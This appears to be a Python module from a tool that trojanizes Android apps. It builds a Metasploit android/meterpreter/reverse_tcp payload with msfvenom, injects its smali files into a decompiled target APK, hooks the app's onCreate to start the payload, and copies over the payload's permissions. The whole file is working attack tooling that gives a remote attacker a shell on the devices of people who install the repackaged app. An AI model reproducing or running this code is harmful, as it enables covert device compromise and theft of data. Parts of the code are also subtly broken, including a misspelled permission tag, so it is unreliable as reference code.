import glob
import logging
import os
import shutil
import xml.etree.ElementTree as ET

from . import utilities
from .apk import Apk
from .utilities import phase


class Payload:
    def __init__(self, host, public_host=None):
        self.__payload_apk = None
        self.host = host
        self.public_host = public_host if public_host else host
        self.__generate_payload()
        self.target_apk = None

    @phase('Generating the payload')
    def __generate_payload(self):
        payload_path = os.path.join(os.getcwd(), 'payload.apk')
        command = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={self.public_host.ip} LPORT={self.public_host.port} -o {payload_path}"
        logging.info('Generating payload...')
        utilities.run_command(command)
        logging.info('    ... Done')
        self.__payload_apk = Apk(payload_path)

    def inject(self, apk):
        self.target_apk = apk
        self.__decompile()
        self.__decompile_target()
        self.__inject_payload_files()
        self.__get_target_main_activity()
        self.__inject_payload_hook()
        self.__inject_permissions()
        self.__remove_decompiled()

    @phase('Decompiling the target APK')
    def __decompile_target(self):
        self.target_apk.decompile()

    @phase("Decompiling the payload's APK")
    def __decompile(self):
        self.__payload_apk.decompile()

    @phase("Injecting payload's file in target APK")
    def __inject_payload_files(self):
        metasploit_package = 'com/metasploit/stage'
        files_to_copy = glob.glob(os.path.join(
            self.__payload_apk.decompiled_path, 'smali/', metasploit_package, '*Payload*.smali'
        ))
        copy_dest = os.path.join(self.target_apk.decompiled_path, 'smali/', metasploit_package)
        if not os.path.exists(copy_dest):
            logging.info(f"Creating folder: '{copy_dest}'")
            os.makedirs(copy_dest)
        for file in files_to_copy:
            logging.info(f"Copying file '{file}' to '{copy_dest}'")
            shutil.copy(file, copy_dest)

    @phase('Injecting missing permissions')
    def __inject_permissions(self):
        """
        :type apk: Apk
        """
        ANDROID_NAME = '{http://schemas.android.com/apk/res/android}name'

        target_tree = ET.parse(os.path.join(self.target_apk.decompiled_path, 'AndroidManifest.xml'))
        target_permissions = [perm.get(ANDROID_NAME) for perm in target_tree.getroot().findall('uses-permission')]
        target_features = [feat.get(ANDROID_NAME) for feat in target_tree.getroot().findall('uses-feature')]

        payload_tree = ET.parse(os.path.join(self.__payload_apk.decompiled_path, 'AndroidManifest.xml'))
        payload_permissions = [perm.get(ANDROID_NAME) for perm in payload_tree.getroot().findall('uses-permission')
                               if perm.get(ANDROID_NAME) not in target_permissions]
        payload_features = [feat.get(ANDROID_NAME) for feat in payload_tree.getroot().findall('uses-feature')
                            if feat.get(ANDROID_NAME) not in target_features]

        for perm in payload_permissions:
            logging.debug(f"Adding permission: '{perm}'")
            permission = ET.SubElement(target_tree.getroot(), 'uses-pemission')
            permission.set(ANDROID_NAME, perm)
        for feat in payload_features:
            logging.debug(f"Adding feature: '{feat}'")
            feature = ET.SubElement(target_tree.getroot(), 'uses-feature')
            feature.set(ANDROID_NAME, feat)
        target_tree.write(os.path.join(self.target_apk.decompiled_path, 'AndroidManifest.xml'), xml_declaration=True,
                          encoding='utf-8')

    @phase("Detecting target's MainActivity")
    def __get_target_main_activity(self):
        main_activity, self.target_main_activity_file = self.target_apk.get_main_activity()
        logging.info(f"The main activity is: '{main_activity}'")

    @phase("Injecting payload's hook")
    def __inject_payload_hook(self):
        with open(self.target_main_activity_file, 'r') as f:
            logging.debug('Reading from Main Activity file')
            main_activity_content = f.read()
        to_find = ';->onCreate(Landroid/os/Bundle;)V'
        to_add = 'invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V'
        logging.debug('Inserting the payload invocation in the Main Activity')
        main_activity_content_lines = main_activity_content.split('\n')
        main_activity_content_lines[:] = [l if to_find not in l else '    ' + to_add for l in
                                          main_activity_content_lines]
        #
        # main_activity_content = main_activity_content.replace(to_find, to_find + '\n    ' + to_add)
        main_activity_content = "\n".join(main_activity_content_lines)
        with open(self.target_main_activity_file, 'w') as f:
            logging.debug('Writing the Main Activity file')
            f.write(main_activity_content)

    @phase('Removing decompiled payload')
    def __remove_decompiled(self):
        self.__payload_apk.remove_decompiled()

    @phase("Deleting payload's APK")
    def delete(self):
        os.remove(self.__payload_apk.full_path)
